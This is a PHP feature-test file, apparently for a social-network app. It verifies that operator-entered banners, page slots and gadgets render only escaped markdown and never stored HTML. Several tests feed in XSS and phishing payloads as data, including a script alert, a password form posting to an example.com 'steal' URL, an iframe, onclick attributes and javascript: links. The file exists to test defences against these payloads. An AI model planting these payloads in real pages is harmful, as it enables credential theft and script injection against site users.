<?php

declare(strict_types=1);

namespace Tests\Feature\Design;

use App\Models\Banner;
use App\Models\Gadget;
use App\Models\GadgetConfig;
use App\Models\Member;
use App\Services\GadgetService;
use App\Support\SnsSettingKey;
use DOMDocument;
use DOMXPath;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

class OperatorContentRenderTest extends TestCase
{
    use RefreshDatabase;

    private const SCRIPT = '<script>alert(1)</script>';

    public function test_the_slots_print_the_markdown_and_never_the_stored_html(): void
    {
        foreach (['top2', 'top', 'bottom2', 'bottom'] as $slot) {
            $this->setSnsSetting(SnsSettingKey::from("pc_html_{$slot}"), self::SCRIPT."<div id=\"raw-{$slot}\"></div>");
            $this->setSnsSetting(SnsSettingKey::from("insert_{$slot}_markdown"), "**md-{$slot}**");
        }

        $html = $this->get('/login')->assertOk()->getContent();

        foreach (['top2', 'top', 'bottom2', 'bottom'] as $slot) {
            $this->assertStringContainsString("<div class=\"markdownBody\"><p><strong>md-{$slot}</strong></p>", $html);
            $this->assertStringNotContainsString("raw-{$slot}", $html);
        }
        $this->assertStringNotContainsString(self::SCRIPT, $html);
    }

    public function test_the_head_insert_is_not_printed(): void
    {
        $this->setSnsSetting(SnsSettingKey::PcHtmlHead, '<meta name="op-head" content="1">');

        $this->get('/login')->assertOk()->assertDontSee('op-head', false);
    }

    public function test_an_empty_slot_prints_no_wrapper(): void
    {
        $this->setSnsSetting(SnsSettingKey::InsertTopMarkdown, '');
        $this->setSnsSetting(SnsSettingKey::FooterBeforeMarkdown, "a\n\nb");

        $this->assertSame(1, substr_count($this->get('/login')->assertOk()->getContent(), 'class="markdownBody"'));
    }

    public function test_markup_typed_into_markdown_does_not_reach_the_page(): void
    {
        $this->setSnsSetting(SnsSettingKey::InsertTopMarkdown, implode("\n\n", [
            '<form action="https://example.com/steal"><input name="password">',
            '<div data-preview-url="https://example.com/x" id="op-hook" class="op-hook" style="position:fixed" onclick="a()">x</div>',
            '<iframe src="https://example.com/"></iframe>',
            self::SCRIPT,
            '[label](javascript:alert(1)) ![pixel](data:image/png;base64,AAAA)',
            '<div',
        ]));

        $html = $this->get('/login')->assertOk()->getContent();
        $start = (int) strpos($html, '<div class="markdownBody">') + strlen('<div class="markdownBody">');
        $slot = substr($html, $start, strpos($html, '</div>', $start) - $start);

        $this->assertStringContainsString('label', $slot);
        // The typed markup survives only as escaped text, so the needles are the forms a browser would act on.
        foreach (['<form', '<input', '<iframe', '<script', 'data-preview-url="', 'id="', 'class="', 'style="', 'onclick="', 'href="javascript', 'src="data:'] as $needle) {
            $this->assertStringNotContainsString($needle, $slot, $needle);
        }
    }

    public function test_a_one_paragraph_footer_sits_in_the_policy_links_paragraph(): void
    {
        $this->setSnsSetting(SnsSettingKey::FooterBefore, self::SCRIPT);

        $xpath = $this->xpath($this->get('/login')->assertOk()->getContent());

        $this->assertSame(1, $xpath->query('//div[@id="FooterContainer"]//p')->length);
        $this->assertSame(3, $xpath->query('//div[@id="FooterContainer"]/p/a')->length);
        $this->assertSame(1, $xpath->query('//div[@id="FooterContainer"]/p/a[@href="https://www.openpne.jp/"]')->length);
        $this->assertSame(0, $xpath->query('//div[@id="FooterContainer"]//div')->length);
        $this->assertSame(0, $xpath->query('//div[@id="FooterContainer"]//script')->length);
    }

    public function test_a_longer_footer_is_a_block_after_the_policy_links(): void
    {
        $this->setSnsSetting(SnsSettingKey::FooterBeforeMarkdown, "first\n\n- item");

        $xpath = $this->xpath($this->get('/login')->assertOk()->getContent());

        $this->assertSame(2, $xpath->query('//div[@id="FooterContainer"]/p/a')->length);
        $this->assertSame(0, $xpath->query('//div[@id="FooterContainer"]/p//div')->length);
        $this->assertSame(0, $xpath->query('//div[@id="FooterContainer"]//p[not(node())]')->length);
        $this->assertSame(1, $xpath->query('//div[@id="FooterContainer"]/div[@class="markdownBody"]/p[text()="first"]')->length);
        $this->assertSame(1, $xpath->query('//div[@id="FooterContainer"]/div[@class="markdownBody"]/ul/li')->length);
    }

    public function test_the_footer_follows_the_page_class(): void
    {
        $this->setSnsSetting(SnsSettingKey::FooterBeforeMarkdown, 'guest-footer');
        $this->setSnsSetting(SnsSettingKey::FooterAfterMarkdown, 'member-footer');

        $this->get('/login')->assertOk()->assertSee('guest-footer')->assertDontSee('member-footer');
        $this->actingAs(Member::factory()->create())->get('/')->assertOk()->assertSee('member-footer')->assertDontSee('guest-footer');
    }

    public function test_the_markdown_styles_are_in_the_head_once(): void
    {
        $html = $this->get('/login')->assertOk()->getContent();

        $this->assertSame(1, substr_count($html, '.markdownBody p {'));
        $this->assertLessThan(strpos($html, '</head>'), strpos($html, '.markdownBody p {'));
        $this->assertStringContainsString('.markdownBody img { max-width: 100%;', $html);
    }

    public function test_a_banner_prints_its_markdown_and_never_its_html(): void
    {
        Banner::create(['name' => 'top_before', 'is_use_html' => true, 'html' => self::SCRIPT.'<b>raw-banner</b>', 'markdown' => '[![ad](/ad.png)](/shop)']);

        $this->get('/login')->assertOk()
            ->assertSee('<div class="markdownBody"><p><a href="/shop"><img src="/ad.png" alt="ad" /></a></p>', false)
            ->assertDontSee('raw-banner', false)
            ->assertDontSee(self::SCRIPT, false);
    }

    public function test_the_member_and_side_placements_print_markdown_too(): void
    {
        Gadget::create(['context' => 'sidebanner', 'zone' => 'contents', 'name' => 'sideBanner', 'sort_order' => 0]);
        app(GadgetService::class)->clearCache();
        foreach (['top_after', 'side_after', 'side_before'] as $name) {
            Banner::create(['name' => $name, 'is_use_html' => true, 'html' => self::SCRIPT."<b>raw-{$name}</b>", 'markdown' => "*md-{$name}*"]);
        }

        $member = $this->actingAs(Member::factory()->create())->get('/')->assertOk()->getContent();

        $this->assertStringContainsString('<p><em>md-top_after</em></p>', $member);
        $this->assertStringContainsString('<p><em>md-side_after</em></p>', $member);
        $this->assertStringNotContainsString('md-side_before', $member);
        $this->assertStringNotContainsString('raw-', $member);
        $this->assertStringNotContainsString(self::SCRIPT, $member);
    }

    public function test_a_free_area_on_the_login_page_prints_its_markdown(): void
    {
        $gadget = Gadget::create(['context' => 'login', 'zone' => 'top', 'name' => 'freeArea', 'sort_order' => 0]);
        GadgetConfig::create(['gadget_id' => $gadget->id, 'name' => 'value', 'value' => self::SCRIPT.'<b>raw-login</b>']);
        GadgetConfig::create(['gadget_id' => $gadget->id, 'name' => 'value_markdown', 'value' => '*md-login*']);
        app(GadgetService::class)->clearCache();

        $this->get('/login')->assertOk()
            ->assertSee('<p><em>md-login</em></p>', false)
            ->assertDontSee('raw-login', false)
            ->assertDontSee(self::SCRIPT, false);
    }

    public function test_a_banner_not_converted_yet_prints_nothing(): void
    {
        Banner::create(['name' => 'top_before', 'is_use_html' => true, 'html' => '<b>raw-banner</b>']);

        $this->get('/login')->assertOk()->assertDontSee('raw-banner', false);
    }

    public function test_the_gadget_bodies_print_their_markdown_and_never_their_html(): void
    {
        foreach (['freeArea', 'informationBox'] as $name) {
            $gadget = Gadget::create(['context' => 'home', 'zone' => 'contents', 'name' => $name, 'sort_order' => 0]);
            GadgetConfig::create(['gadget_id' => $gadget->id, 'name' => 'value', 'value' => self::SCRIPT."<b>raw-{$name}</b>"]);
            GadgetConfig::create(['gadget_id' => $gadget->id, 'name' => 'value_markdown', 'value' => "*md-{$name}*"]);
        }
        app(GadgetService::class)->clearCache();

        $html = $this->actingAs(Member::factory()->create())->get('/')->assertOk()->getContent();

        foreach (['freeArea', 'informationBox'] as $name) {
            $this->assertStringContainsString("<div class=\"markdownBody\"><p><em>md-{$name}</em></p>", $html);
            $this->assertStringNotContainsString("raw-{$name}", $html);
        }
        $this->assertStringNotContainsString(self::SCRIPT, $html);
    }

    public function test_raw_mode_prints_the_html_and_ignores_the_markdown(): void
    {
        config(['openpne.security.operator_raw_html' => true]);
        $this->setSnsSetting(SnsSettingKey::PcHtmlTop, '<div id="raw-top"></div>');
        $this->setSnsSetting(SnsSettingKey::InsertTopMarkdown, 'md-top');
        Banner::create(['name' => 'top_before', 'is_use_html' => true, 'html' => '<b>raw-banner</b>', 'markdown' => 'md-banner']);

        $this->get('/login')->assertOk()
            ->assertSee('<div id="raw-top"></div>', false)
            ->assertSee('<b>raw-banner</b>', false)
            ->assertDontSee('md-top')
            ->assertDontSee('md-banner')
            ->assertDontSee('class="markdownBody"', false);
    }

    private function xpath(string $html): DOMXPath
    {
        $document = new DOMDocument;
        @$document->loadHTML('<?xml encoding="UTF-8">'.$html);

        return new DOMXPath($document);
    }
}
